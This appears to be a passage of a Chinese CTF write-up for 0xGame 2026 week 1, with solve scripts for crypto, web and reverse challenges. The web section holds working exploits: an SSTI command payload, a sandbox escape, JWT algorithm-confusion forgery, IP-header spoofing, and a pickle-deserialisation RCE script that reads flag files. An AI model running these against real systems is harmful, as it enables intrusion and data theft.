            digest = hashlib.sha256(int_bytes(shared)).hexdigest()
            if digest == expected_hash:
                residue = candidate
                break

        if residue is None:
            raise RuntimeError(f"no hash match for B[{index}]")

        print(f"[+] B[{index}] order={order}, a mod order={residue}")
        residues.append(residue)
        moduli.append(order)

    a = crt(residues, moduli)

    # The challenge chooses the representative below the recovered modulus.
    if pow(g, a, p) != A:
        raise RuntimeError(
            "CRT result does not reproduce A; check the challenge parameters"
        )

    return a


def find_m(p: int, B: int, choice: str) -> int:
    target = ord(choice)
    for m in range(1, 1_000_000):
        if pow(B, m, p) & 0xFF == target:
            return m
    raise RuntimeError(f"could not find m for option {choice}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--sequence",
        help="non-interactive option sequence, e.g. CAC",
    )
    args = parser.parse_args()

    sock = socket.create_connection((HOST, PORT), timeout=15)
    sock.settimeout(8)

    first = recv_until(sock, b"a = ")
    p = parse_int(rb"p = (\d+)", first)
    g = parse_int(rb"g = (\d+)", first)
    A = parse_int(rb"A = (\d+)", first)
    B_text = re.search(rb"B = \[(.*?)\]", first, re.S).group(1)
    Bs = [int(item) for item in B_text.split(b",")]
    hashes = re.findall(rb"'([0-9a-f]{64})'", first)

    a = recover_a(p, g, A, Bs, [h.decode() for h in hashes])
    print(f"[+] recovered a = {a}")
    sock.sendall(f"{a}\n".encode())

    round_index = 0
    while True:
        prompt = recv_until(sock, b"m = ")
        if b"m = " not in prompt:
            print(prompt.decode("utf-8", "replace"), end="")
            break

        round_index += 1
        print(prompt.decode("utf-8", "replace"), end="")
        B = parse_int(rb"B = (\d+)", prompt)

        if args.sequence is not None:
            if round_index > len(args.sequence):
                raise RuntimeError("--sequence ended before the server finished")
            choice = args.sequence[round_index - 1].upper()
        else:
            choice = input("选择 A/B/C: ").strip().upper()

        if choice not in "ABC":
            raise RuntimeError("choice must be A, B, or C")

        m = find_m(p, B, choice)
        print(f"[+] option={choice}, m={m}")
        sock.sendall(f"{m}\n".encode())

        if args.sequence is not None and round_index == len(args.sequence):
            # Let the server send the flag or failure text.
            try:
                tail = sock.recv(8192)
                print(tail.decode("utf-8", "replace"), end="")
            except socket.timeout:
                pass
            break


if __name__ == "__main__":
    main()
```



```text
0xGame{Master_Origami}
```



### 为美好的密码献上解密

> **目前平台复现环境不稳定，此题 wp 可能有偏差**

NIST P-521 曲线上的 ECDSA：

```text
curve = NIST521p
hash  = sha512
```

ECDSA 的签名公式为：

$$
s = k^{-1}(z + rd) \pmod n
$$

其中：

- $d$：私钥 (k\)：每次签名使用的临时 nonce $z=H(m)$：消息哈希 (r,s\)：签名(n\)：P-521 基点的阶

题目提示说 nonce 由长度为 5 的 LFSR 生成。

如果 LFSR 使用最大周期，其周期为 2^5-1=31

因此请求 32 个签名时，第 1 个和第 32 个签名会使用相同的 nonce，

服务端要求最小交互次数，所以输入：32

#### 利用重复 nonce 恢复私钥

两组签名为：

$$
s_1=k^{-1}(z_1+rd)\pmod n
$$

$$
s_2=k^{-1}(z_2+rd)\pmod n
$$

两式相减可得：

$$
k=\frac{z_1-z_2}{s_1-s_2}\pmod n
$$

得到 $k$ 后，再计算：

$$
d=\frac{s_1k-z_1}{r}\pmod n
$$

P-521 的阶为：

```python
n = int(
    "1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
    "FA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409",
    16,
)
```

需要注意消息哈希：服务端打印的 `msg` 是十六进制字符串，但实际应对这串字符串本身做 SHA-51

本题恢复出的私钥为：

```text
d = 11786190273906782566706300546504742629011900435269701041731697414027484824601255112180676531145294320443777235338538357924760601782873554458995940394745073
```

发送 `y` 后，服务端要求签名

ECDSA 中：

$$
r=x(kG)\bmod n
$$

把这个 `r` 和 NIST P-521 基点的横坐标比较，可以发现：

$$
r=x(G)\bmod n
$$

因此：

$$
k=1
$$

由于椭圆曲线中 $G$ 和 $-G$ 的横坐标相同，所以 $k=n-1$ 也会产生同一个 `r`。

#### 计算 s

最终消息的哈希：

```python
message = "the treasure lies hidden within the mirror"
z = int.from_bytes(hashlib.sha512(message.encode()).digest(), "big")
```

当 $k=1$ 时：

$$
s=(z+rd)\pmod n
$$

服务端要求 low-S 形式，因此还需要规范化：

$$
s_{low}=n-s
$$



自动化exp

```python
import argparse
import hashlib
import re
import socket


N = int(
    "1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
    "FA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409",
    16,
)
COUNT = 32
MESSAGE = "the treasure lies hidden within the mirror"


def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(8192)
        if not chunk:
            break
        data += chunk
    return data


def digest(text):
    # The printed signature messages are hexadecimal text; the service hashes
    # that ASCII text directly rather than bytes.fromhex(text).
    return int.from_bytes(hashlib.sha512(text.encode()).digest(), "big")


def recover_key(signatures):
    groups = {}
    for msg, r, s in signatures:
        groups.setdefault(r, []).append((msg, s))
    repeated = next((items for items in groups.values() if len(items) >= 2), None)
    if repeated is None:
        raise RuntimeError("没有找到重复 r，请确认请求的是 32 个签名")

    (m1, s1), (m2, s2) = repeated[:2]
    r = next(r for r, items in groups.items() if items is repeated)
    z1, z2 = digest(m1), digest(m2)
    k = (z1 - z2) * pow((s1 - s2) % N, -1, N) % N
    d = (s1 * k - z1) * pow(r, -1, N) % N
    return d, k


def parse_signatures(text):
    lines = text.decode(errors="replace").splitlines()
    result = []
    for i, line in enumerate(lines):
        if line.strip().startswith("msg") and i + 2 < len(lines):
            msg = line.split("=", 1)[1].strip()
            r = int(lines[i + 1].split("=", 1)[1].strip())
            s = int(lines[i + 2].split("=", 1)[1].strip())
            result.append((msg, r, s))
    if len(result) != COUNT:
        raise RuntimeError(f"只解析出 {len(result)} 组签名")
    return result


def read_tail(sock):
    chunks = []
    sock.settimeout(3)
    while True:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="nc1.ctfplus.cn")
    parser.add_argument("--port", type=int, default=36578)
    args = parser.parse_args()

    with socket.create_connection((args.host, args.port), timeout=20) as sock:
        sock.settimeout(20)
        banner = recv_until(sock, b"How many signatures do you want?")
        print(banner.decode(errors="replace"), end="")

        sock.sendall(f"{COUNT}\n".encode())
        signatures_text = recv_until(sock, b"Have you decrypted successfully?")
        print(signatures_text.decode(errors="replace"), end="")
        signatures = parse_signatures(signatures_text)
        d, repeated_k = recover_key(signatures)
        print(f"[+] recovered k = {repeated_k}")
        print(f"[+] recovered d = {d}")

        sock.sendall(b"y\n")
        challenge = recv_until(sock, b"s =")
        print(challenge.decode(errors="replace"), end="")
        match = re.search(rb"r\s*=\s*(\d+)", challenge)
        if not match:
            raise RuntimeError("没有解析到固定 r")
        fixed_r = int(match.group(1))

        z = digest(MESSAGE)
        # For this challenge fixed_r = x(G), so k=1.  Use low-S form.
        high_s = (z + fixed_r * d) % N
        final_s = min(high_s, N - high_s)
        print(f"[+] final s = {final_s}")
        sock.sendall(f"{final_s}\n".encode())

        result = read_tail(sock)
        print(result.decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
```



```text
0xGame{Offer the decryption for the beautiful password}
```



## Web

### ez_64

目标是命中/usr/bin/base64

```http
http://80-a689591b-b77a-4ea7-8d28-5cfbf1e1fb51.challenge.ctfplus.cn/?c=/???/???/?a??64%20fla?.???
```

成功获取回显

```txt
PD9waHAKJGZsYWcgPSAnMHhHYW1lezk2YjVlZmM3LTgyMWQtNDYzOS1hNTVlLTU0YzYzYzk1NGQx OX0nOwo/Pgo=
```

解码可得 flag：

```text
0xGame{96b5efc7-821d-4639-a55e-54c63c954d19}
```



### ATP代码实验

用浏览器的按钮打开开发工具可以读取 submit.js，打开console提交

```javascript
const ref = [...document.querySelectorAll('pre,code')]
  .find(e => e.textContent.includes('int glycolysis'))
  .textContent;

const editor = document.getElementById('code-editor');
editor.value = ref;
editor.dispatchEvent(new Event('input', { bubbles: true }));

document.getElementById('submit-form').requestSubmit();
```

![](../../assets/imports/0xgame2026-week1/image-20261002210156584.png)

```text
0xGame{91d27371-46bb-4cff-87a1-6e05aaf177f5}
```



### 一切的开始

访问robots.txt，提示请get传参aaa=flag

```bash
└─$ curl 'http://5000-3e2fcd70-7e42-4de0-96c2-1887de7ea008.challenge.ctfplus.cn/inex233?aaa=flag'
请post传参bbb=flag

└─$ curl -X POST 'http://5000-3e2fcd70-7e42-4de0-96c2-1887de7ea008.challenge.ctfplus.cn/inex233?aaa=flag' -d 'bbb=flag'
要带上sweet的小饼干

└─$ curl -X POST 'http://5000-3e2fcd70-7e42-4de0-96c2-1887de7ea008.challenge.ctfplus.cn/inex233?aaa=flag' -d 'bbb=flag' -H 'Cookie: sweet=sweet'
你必须来自127.0.0.1
```

需要伪造来源 IP，请求头带上 `X-Forwarded-For / X-Real-IP / Client-Ip / X-Client-IP / True-Client-IP: 127.0.0.1`（单带某一个不行，需全带上）

```bash
└─$ curl -X POST 'http://5000-3e2fcd70-7e42-4de0-96c2-1887de7ea008.challenge.ctfplus.cn/inex233?aaa=flag' -d 'bbb=flag' -H 'Cookie: sweet=sweet' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Client-IP: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'Referer: http://127.0.0.1'
请json传参web：flag

└─$ curl -X POST 'http://5000-3e2fcd70-7e42-4de0-96c2-1887de7ea008.challenge.ctfplus.cn/inex233?aaa=flag' -d '{"bbb":"flag","web":"flag"}' -H 'Cookie: sweet=sweet' -H 'X-Forwarded-For: 127.0.0.1' -H '
X-Real-IP: 127.0.0.1' -H 'Client-IP: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'True-Client-IP: 127.
0.0.1' -H 'Referer: http://127.0.0.1' -H 'Content-Type: application/json'
0xGame{0360ce3a-1b33-4c9c-be6c-e83e22c2ef3f}
```

```text
0xGame{a19aa5d6-f6b2-4cc4-8f78-cf2f59455e57}
```



### 渲染如呼吸一样简单

根据名字大概能猜出是SSTI

首先 输入 `7*7` 观察到渲染结果为 `49`

然后输入 `7*'7'` 观察到渲染结果为 `7777777`，确认为 **Python 底层的jinja2模板**

输入 `config` 和 `''.__class__`  返回 `<class 'str'>` 发现似乎没有设置沙箱。

`lipsum` 是 Jinja2 内置全局对象，它的 `__globals__` 里挂着 `os` 模块

于是

```python
lipsum.__globals__['os'].popen('env').read()
```

读取flag：

```text
0xGame{3ba2e2b0-2a1c-4945-baac-d626aa6b1136}
```



### 错位的签名

首先弱密码登录：guest/guest123

得到hint:

```text
网关版本：Apache APISIX 3.16.0
这是一个已知受影响的历史版本。
方向提示：漏洞和 JWT 有关。
年份提示：看一看 2026 年修复的 JWT 相关 CVE。
再想一想：如果一个系统既信公钥，又信 token 头里的 alg，会发生什么？
```

抓包找jwt

```html
<a class="panel danger" href="/flag?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsInN1YiI6Imd1ZXN0IiwiZXhwIjoxNzkwOTU2NjEwLCJuYmYiOjE3OTA5NTI5NTB9.m0Pnve5bVHSUZz8XLGIvH-QrZRet4FDK8UW8dsIfYw1998P0M7DVUJn8KE9z97rtXokTCCVcfKv06GO842IlLaMnvMAG-zF3wnlTcRjzyFsMfUNf2ZGCpME4uSSx_yofdwGQ1Xd3LvFrGWtz03RLhoEfezN05pVbd7vCSUayKTk-94NfVV-5Idot_qKegPdy-kpkJHB57c6GN8ZDq_m0ASo6XVJJ6Q0zYXw94ZrBQCg6PzKSh6dqT_l4yM5nzwm5nCwUCPFgJbB3Aj5DicAhmT8qaPufm6cqeR_RC3_xq7ohcyX8_OR1FGscZaZvxx6x1A5qmjyrQq01WEpLa9yabw">
```

得到

```text
{"alg":"RS256","typ":"JWT"}{"key":"guest","role":"guest","sub":"guest","exp":1790956610,"nbf":1790952950}
```

dashboard找到了RS256公钥

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----
```

手动构造jwt

```python
import json
import hmac
import hashlib
import base64
import time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "key": "admin",
    "role": "admin",
    "sub": "admin",
    "exp": int(time.time()) + 86400 * 365,
    "nbf": int(time.time())
}

public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----"""

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

signing_input = f"{h}.{p}".encode()
signature = hmac.new(
    public_key_pem.encode("utf-8"),
    signing_input,
    hashlib.sha256
).digest()

s = b64url(signature)
token = f"{h}.{p}.{s}"

print(token)
```

劫持/flag请求并改包，

![](../../assets/imports/0xgame2026-week1/image-20261002231424448.png)

```text
0xGame{f77f72a8-af40-45f4-b8be-7c5635ac3c9f}
```



### 漏风的沙箱

这个沙箱有三层防护：正则匹配、AST 检查、受限 builtins。盲区：

1. **`__traceback__` 未被禁止** — `DANGEROUS_ATTRIBUTES` 禁了 `__class__`、`__globals__`、`__builtins__` 等，但漏了 `__traceback__`。通过异常对象的 traceback 可以拿到 frame → `f_globals`（即 sandbox 字典）。
2. **字符串拼接绕过正则** — `'__built'+'ins__'` 在源码中不形成完整的 `__builtins__`，正则匹配不到。
3. **变量下标绕过 AST** — `visit_Subscript` 只检查 `ast.Constant` 类型的字符串切片。用变量（`ast.Name`）做下标完全不检查：`g[k]` 安全通过。
4. **eval 二次执行** — 从 builtins 字典中取出 `eval`，然后在运行时构造完整的 `__import__('os').popen('cat /app/flag.txt').read()` 表达式

```python
try:
    1/0
except Exception as e:
    g = e.__traceback__.tb_frame.f_globals
    b = g['__built'+'ins__']
    ev = b['ev'+'al']
    cmd = "__imp" + "ort__('os').po" + "pen('cat /app/flag.txt').re" + "ad()"
    print(ev(cmd))
```

```text
0xGame{d7e467b4-d8e7-4ad3-92a2-14091ca58dd6}
```





### pollute the key

python原型链污染题

#### 第一层：pydash 原型链污染

`/api/user/update` 使用 `pydash.set_(me, key, value)` 更新用户属性，仅过滤了 `__builtins__`。pydash 5.x 允许通过 `__class__.__init__.__globals__` 路径访问并修改模块级全局变量：

```json
{
  "key": "__class__.__init__.__globals__.SECRET_KEY",
  "value": "pwned_key_12345"
}
```

这一条请求就把 JWT 签名密钥改成了我们知道的值。

#### 第二层：伪造 admin JWT

知道 `SECRET_KEY` 后，可以用标准 HS256 签名伪造任意 payload 的 JWT：

```json
{"username": "pwntest1", "role": "admin", "exp": 9999999999}
```

拿到 admin 权限后，就能访问 `/api/order/buy` 接口。

#### 第三层：pickle 反序列化 → RCE

`/api/order/buy` 对购物车数据执行 `pickle.loads(base64.b64decode(raw))`，且**无任何过滤**。利用 `eval` + list comprehension 构造 payload：

- 执行 `cat /flag` 读取 flag
- 将 flag 内容注入到 `PRODUCTS` 全局列表中
- `eval` 返回 list，通过 `isinstance(cart, list)` 检查
- 下单成功后，flag 出现在 `order.items` 的响应中



```python
#!/usr/bin/env python3
import base64, json, hmac, hashlib, time, requests, pickle

TARGET = "http://5000-5eabecc7-02ff-4502-bbff-86e504f11692.challenge.ctfplus.cn"
KNOWN_KEY = "pwned_exploit_key"
USERNAME = f"exp_{int(time.time())}"
PASSWORD = "password123"


def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def make_jwt(payload, secret, alg="HS256"):
    header = {"alg": alg, "typ": "JWT"}
    h = b64e(json.dumps(header, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64e(sig)}"


def make_pickle_cart(cmd):
    """构造 eval+list wrap 的 pickle payload，执行命令并注入 PRODUCTS"""
    code = (
        f"[PRODUCTS.insert(0, {{"
        f"'id':'pwn','name':__import__('os').popen({repr(cmd)}).read().strip(),"
        f"'price':0.01,'icon':'X'}}), 'pwn']"
    )
    return base64.b64encode(pickle.dumps(code)).decode() if False else \
           base64.b64encode(pickle.dumps(
               type("R", (), {"__reduce__": lambda s: (eval, (code,))})()
           )).decode()


# ========== Step 1: 注册 + 登录 ==========
print("[1] Register & Login")
s = requests.Session()
s.post(f"{TARGET}/api/register", json={
    "username": USERNAME, "password": PASSWORD, "email": "x@x.com"
})
s.post(f"{TARGET}/api/login", json={
    "username": USERNAME, "password": PASSWORD
})

# ========== Step 2: 污染 SECRET_KEY ==========
print("[2] Pollute SECRET_KEY via pydash prototype chain")
r = s.post(f"{TARGET}/api/user/update", json={
    "key": "__class__.__init__.__globals__.SECRET_KEY",
    "value": KNOWN_KEY
})
assert r.json()["ok"], f"Pollute failed: {r.json()}"
print("    SECRET_KEY →", KNOWN_KEY)

# ========== Step 3: 伪造 admin JWT ==========
print("[3] Forge admin JWT")
now = int(time.time())
admin_payload = {
    "username": USERNAME, "role": "admin",
    "iat": now, "exp": now + 99999
}
forged_token = make_jwt(admin_payload, KNOWN_KEY)
cookies = {"token": forged_token}

# 验证 admin 权限
r = requests.get(f"{TARGET}/api/order/list", cookies=cookies)
assert r.json()["ok"], f"Admin access failed: {r.json()}"
print("    Admin access confirmed ✓")

# ========== Step 4: Pickle RCE  ==========
print("[4] Locate flag file...")

locations = [
    "cat /flag 2>/dev/null",
    "cat /app/flag.txt 2>/dev/null",
    "find / -name '*flag*' -type f 2>/dev/null",
    "cat /tmp/flag 2>/dev/null",
    "ls -la /app/*.txt 2>/dev/null",
]

for loc in locations:
    class Probe:
        def __reduce__(self):
            return (eval, (
                f"[PRODUCTS.insert(0, {{"
                f"'id':'probe','name':__import__('os').popen({repr(loc)}).read().strip()[:200],"
                f"'price':0.01,'icon':'P'}}), 'probe']"
            ,))
    
    cart = base64.b64encode(pickle.dumps(Probe())).decode()
    r = requests.post(f"{TARGET}/api/order/buy", data={"cart": cart}, cookies=cookies)
    result = r.json()
    if result["ok"] and result["order"]["items"][0]:
        print(f"  {loc}")
        print(f"  → {result['order']['items'][0]}")
    else:
        print(f"  {loc} → (empty)")
```



```text
0xGame{02d7b2f9-9912-4574-8540-ace892ce3334}
```



## Reverse

### Signin

你知道的，我很喜欢 grep(x)

```bash
(base) ┌──(rekjo㉿LAPTOP-BMERJF8L)-[/mnt/e/Downloads/signin]
└─$ strings * | grep 0x
Welcome to 0xGame2026!!
0xGame{0pen_1DA_4nd_start_y0ur_reverse_Engineering!}
  VirtualProtect failed with code 0x%x
```

```text
0xGame{0pen_1DA_4nd_start_y0ur_reverse_Engineering!}
```



### 欸？云朵

一晃而过，

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct tagMSG Msg; // [rsp+60h] [rbp-20h] BYREF
  WNDCLASSA WndClass; // [rsp+90h] [rbp+10h] BYREF
  HWND hWnd; // [rsp+D8h] [rbp+58h]

  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)sub_401871;
  WndClass.hInstance = hInstance;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = (HBRUSH)6;
  WndClass.lpszClassName = "CloudFlashWindow";
  if ( !RegisterClassA(&WndClass) )
    return 1;
  hWnd = CreateWindowExA(
           0,
           "CloudFlashWindow",
           "0xGame2026",
           0xCF0000u,
           0x80000000,
           0x80000000,
           520,
           180,
           0,
           0,
           hInstance,
           0);
  if ( !hWnd )
    return 1;
  ShowWindow(hWnd, nShowCmd);
  UpdateWindow(hWnd);
  Sleep(1u);
  DestroyWindow(hWnd);
  memset(&Msg, 0, sizeof(Msg));
  while ( GetMessageA(&Msg, 0, 0, 0) > 0 )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return 0;
}
```

Sleep(1u);下断点即可。

![](../../assets/imports/0xgame2026-week1/image-20261003002805412.png)

```text
0xGame{Dyn4m1c_1$_s0_Fun!}
```

> PS: 其实也可以直接截图



### Guess

pyinstaller程序，先解包，并反编译game.pyc

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'game.py'
# Bytecode version: 3.14rc3 (3627)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import random
import struct
DELTA = 2654435769
MASK = 4294967295
TEA_KEY = b'guess_secret_key'
FLAG_CIPHERTEXT = bytes.fromhex('1102c93630fe71bd39ad4e4cc34600299897001c3300581e465c56d2a11ba430819e7a59f1c20188f40ccba3a312dd3d')
def tea_decrypt(data: bytes, key: bytes) -> bytes:
    # irreducible cflow, using cdg fallback
    """Decrypt little-endian TEA blocks."""
    # ***<module>.tea_decrypt: Failure: Compilation Error
    words = struct.unpack('<4I', key)
    result = bytearray()
    for offset in range(0, len(data), 8):
        left, right = struct.unpack('<2I', data[offset:offset + 8])
        total = DELTA * 32 & MASK
        for _ in range(32):
            right = right - ((left << 4) + words[2] ^ left + total ^ (left >> 5) + words[3]) & MASK
            total = total - DELTA & MASK
            left = left - ((right << 4) + words[0] ^ right + total ^ (right >> 5) + words[1]) & MASK
        result.extend(struct.pack('<2I', left, right))
    padding = result[(-1)]
    if not (1 <= padding <= 8 and result[-padding:] != bytes([padding]) * padding):
        raise ValueError('bad padding')
            return bytes(result[:-padding])
def main() -> None:
    print('Welcome to 0xGame2026!')
    print('Let\'s play a game now.')
    print('You have five chances to guess the number（0-100）')
    target = random.randint(0, 100)
    for _ in range(5):
        try:
            guess = int(input('> ').strip())
        except (EOFError, ValueError):
            print('Wrong!')
            print('Try again!')
        else:
            if guess == target:
                print('You win!')
                print('flag is 0xGame{I‘m just kidding :D}')
                secret = tea_decrypt(FLAG_CIPHERTEXT, TEA_KEY)
                if not secret.startswith(b'0xGame{'):
                    raise RuntimeError('integrity check failed')
                else:
                    return None
            else:
                print('Wrong!')
                print('Try again!')
if __name__ == '__main__':
    main()
```

有delta，32轮，确认为 tea 族加密，注意到进行了魔改

```python
right -= ...
total -= DELTA
left -= ...
```

抄一下解密函数 :D

```python
import struct

DELTA = 0x9E3779B9
MASK = 0xFFFFFFFF

key = b"guess_secret_key"

ct = bytes.fromhex(
    "1102c93630fe71bd39ad4e4cc3460029"
    "9897001c3300581e465c56d2a11ba430"
    "819e7a59f1c20188f40ccba3a312dd3d"
)

words = struct.unpack("<4I", key)

result = bytearray()

for offset in range(0, len(ct), 8):
    left, right = struct.unpack("<2I", ct[offset:offset + 8])

    total = (DELTA * 32) & MASK

    for _ in range(32):
        right = (
            right
            - (
                ((left << 4) + words[2])
                ^ (left + total)
                ^ ((left >> 5) + words[3])
            )
        ) & MASK

        total = (total - DELTA) & MASK

        left = (
            left
            - (
                ((right << 4) + words[0])
                ^ (right + total)
                ^ ((right >> 5) + words[1])
            )
        ) & MASK

    result.extend(struct.pack("<2I", left, right))

padding = result[-1]
result = result[:-padding]

print(result.decode())
```

```text
0xGame{Congratulations_0n_y0ur_v1ct0ry：）}
```



### 欸？云朵のrevenge

> PSS: 真的可以截图

![](../../assets/imports/0xgame2026-week1/image-20261003010549358.png)

好了其实不行

显然有反调试

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct tagMSG Msg; // [rsp+60h] [rbp-20h] BYREF
  WNDCLASSA WndClass; // [rsp+90h] [rbp+10h] BYREF
  HWND hWnd; // [rsp+D8h] [rbp+58h]

  if ( (unsigned __int8)sub_4017DC() )
    return 0;
  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)sub_401B4B;
  WndClass.hInstance = hInstance;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = (HBRUSH)6;
  WndClass.lpszClassName = "CloudFlashWindow";
  if ( !RegisterClassA(&WndClass) )
    return 1;
  hWnd = CreateWindowExA(
           0,
           "CloudFlashWindow",
           "0xGame2026",
           0xCF0000u,
           0x80000000,
           0x80000000,
           520,
           180,
           0,
           0,
           hInstance,
           0);
  if ( !hWnd )
    return 1;
  ShowWindow(hWnd, nShowCmd);
  UpdateWindow(hWnd);
  Sleep(1u);
  DestroyWindow(hWnd);
  memset(&Msg, 0, sizeof(Msg));
  while ( GetMessageA(&Msg, 0, 0, 0) > 0 )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return 0;
}
```

```c
__int64 sub_4017DC()
{
  return sub_401793();
}
```

那直接把这个小函数返回值改成0

即

```asm
.text:00000000004017E4                 call    sub_401793
->
.text:00000000004017E4                 xor     eax, eax
.text:00000000004017E6                 nop
.text:00000000004017E7                 nop
.text:00000000004017E8                 nop
```

同样在 `sleep(1u)`下断点即可。

```text
0xGame{Dyn4m1c_Dyn4m1c_Dyn4m1c}
```

另解：

```asm
.text:00000000004017E9                 add     rsp, 20h
```

可以在这里下断点修改寄存器值

![](../../assets/imports/0xgame2026-week1/image-20261003115317537.png)



### ez_flower

```asm
.text:00401069 33 C0                                   xor     eax, eax
.text:0040106B 74 03                                   jz      short near ptr loc_40106F+1
.text:0040106D 11 22                                   adc     [edx], esp
.text:0040106F
.text:0040106F                         loc_40106F:                             ; CODE XREF: .text:0040106B↑j
.text:0040106F 33 FC                                   xor     edi, esp
```

明显是恒跳转，修复

```asm
.text:00401069 90                                      nop
.text:0040106A 90                                      nop
.text:0040106B 90                                      nop
.text:0040106C 90                                      nop
.text:0040106D 90                                      nop
.text:0040106E 90                                      nop
.text:0040106F 90                                      nop
.text:00401070 FC                                      cld
```

然后create function sub_401060.

其他地方类似

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *Stream; // eax
  FILE *Stream_1; // eax
  char encrypted[48]; // [esp+Ch] [ebp-E8h] BYREF
  char target[48]; // [esp+3Ch] [ebp-B8h] BYREF
  char input[128]; // [esp+6Ch] [ebp-88h] BYREF
  unsigned int j; // [esp+ECh] [ebp-8h]
  int i; // [esp+F0h] [ebp-4h]

  SetConsoleOutputCP(0xFDE9u);
  xor_get_string((int)&input_flag, 0xCu);
  Stream = __acrt_iob_func(1u);
  fflush(Stream);
  Stream_1 = __acrt_iob_func(0);
  if ( fgets(input, 128, Stream_1) )
  {
    for ( i = 0; input[i] && input[i] != 13 && input[i] != 10; ++i )
      ;
    input[i] = 0;
    if ( i != 47 )
      goto LABEL_14;
    for ( j = 0; j < 0x2F; ++j )
      target[j] = cipher[j] ^ 0x80;
    caesar(input, encrypted, 0x2Fu);
    if ( !memcmp(encrypted, target, 0x2Fu) )
    {
      xor_get_string((int)&correct, 0x20u);
      putchar(10);
      return 0;
    }
    else
    {
LABEL_14:
      xor_get_string((int)"\r(54=z<6;=t", 0xBu);
      putchar(10);
      return 0;
    }
  }
  else
  {
    xor_get_string((int)&r_54_z_6__t_, 0xCu);
    putchar(10);
    return 1;
  }
}
```

```python
data = bytes.fromhex(
    "B0E5CEE8F4ECFBC4F6C4DFC1EFB3DFED"
    "B1F6E4B3F9A4DFC0F9ECDFDAD6F6B0F6"
    "F6A0E9B3C0E2B7F0EDE2F3F3A1A1FD"
)

data = bytes(x ^ 0x80 for x in data)

def dec(c):
    if ord('a') <= c <= ord('z'):
        return (c - ord('a') - 7) % 26 + ord('a')
    if ord('A') <= c <= ord('Z'):
        return (c - ord('A') - 7) % 26 + ord('A')
    return c

flag = bytes(dec(c) for c in data)

print(flag.decode())
```

```text
0xGame{WoW_Th3_f1ow3r$_@re_SOo0oo b3@u7ifull!!}
```



### 旧时代的信号

```bash
└─$ file *
attachment3.EXE: MS-DOS executable, MZ for MS-DOS
```

16位程序，IDA需要用 Intel 8086架构进行反汇编

**什么？你想反编译吗，ghrida会让你失望（**

```c

